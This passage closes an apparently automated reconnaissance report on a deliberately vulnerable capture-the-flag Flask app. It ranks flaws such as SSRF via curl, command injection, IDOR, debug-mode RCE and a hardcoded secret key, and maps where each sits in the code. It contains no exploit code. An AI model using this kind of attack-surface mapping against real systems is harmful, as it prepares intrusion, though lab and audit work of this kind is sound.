6. **SSRF via curl** - `/app/app.py:18` - Access internal services, cloud metadata, local files.
7. **Debug Mode Enabled** - `/app/app.py:66` - Werkzeug debugger provides additional RCE vector.

### Severity: MEDIUM
8. **Information Disclosure** - All users can view all URLs. No data privacy.
9. **No Rate Limiting** - Unlimited exploitation attempts, DoS risk.
10. **No Security Headers** - Missing defense-in-depth browser protections.

---

## 12. Files and Code Locations Reference

### Primary Application Files
- `/app/app.py` (67 lines) - Main application, all routes and logic
- `/app/templates/add_url.html` (74 lines) - URL submission form
- `/app/templates/view_urls.html` (61 lines) - URL listing page

### Configuration Files
- `/app/requirements.txt` - Python dependencies
- `/app/Dockerfile` - Container build configuration
- `/docker-compose.yml` - Docker orchestration
- `/.env` - Environment variables (FLAG value)

### Data Storage
- `/app/instance/urls.db` - SQLite database (created at runtime)
- `/app/flag.txt` - CTF flag file (created at runtime)

### Critical Code Locations
- Command Injection Sink: `/app/app.py:17-21` (`check_url()` function)
- User Input Reception: `/app/app.py:27` (`request.form['url']`)
- IDOR Vulnerability: `/app/app.py:48-54` (`delete_url()` function)
- Secret Key: `/app/app.py:6` (`app.secret_key = 'YourSecretKey'`)
- Debug Mode: `/app/app.py:66` (`debug=True`)

---

**END OF RECONNAISSANCE DELIVERABLE**

This comprehensive attack surface map provides all necessary intelligence for subsequent vulnerability analysis phases. The application's complete lack of authentication/authorization controls and critical command injection vulnerability make it highly exploitable by external attackers without any prior access or credentials.